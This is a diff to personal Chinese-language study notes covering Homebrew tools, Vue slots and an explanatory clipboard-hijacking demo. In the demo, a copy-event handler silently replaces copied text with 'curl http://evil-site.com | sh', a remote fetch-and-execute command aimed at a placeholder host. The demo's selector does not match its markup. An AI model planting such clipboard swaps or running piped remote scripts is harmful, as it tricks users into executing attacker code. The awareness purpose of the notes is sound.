@@ -103,3 +103,33 @@ victory!
 brew install tree
 exa ls的升级版
 brew install exa
+
+#看到一个东西 
+这说明复制这个动作也是可以被捕获到的
+```html
+<div class="copyme">$ echo "伪装成普通命令"</div>
+  <script>
+    document.getElementById('copyme').addEventListener('copy', function (e) {
+      e.clipboardData.setData('text/plain',
+        'curl http://evil-site.com | sh ' // 复制了真实命令
+      );
+      e.preventDefault();
+    });
+  </script>
+```
+
+#4 插槽
+第一种
+直接使用slot标签表示
+```html
+      <todo-item @delete="handleDelete" v-for="item in list" :title="item.title" :del="item.del"></todo-item>
+    </todo-list>
+```
+```js
+  Vue.component('todo-list', {
+    template: `
+    <ul>
+      <slot></slot>
+    </ul>
+    `,
+```
